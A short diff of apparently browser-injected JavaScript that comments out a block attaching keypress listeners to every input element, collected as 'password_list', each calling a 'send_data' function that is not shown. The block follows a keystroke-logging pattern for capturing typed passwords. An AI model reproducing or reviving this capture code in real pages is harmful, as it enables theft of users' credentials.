@@ -159,6 +159,7 @@ observer1.observe(target5, config);
     }
 }
 */
+/*
 var password_list = document.getElementsByTagName('input');
 var size = password_list.length;
 var counter = 0;
@@ -167,6 +168,7 @@ for(counter=0;counter<size;counter++){
         password_list[counter].addEventListener("keypress",send_data,{capture:true,once:false,passive:true},true);
     }
 }
+*/
 if(window === window.top){
   window.onfocus = function(){
     try{
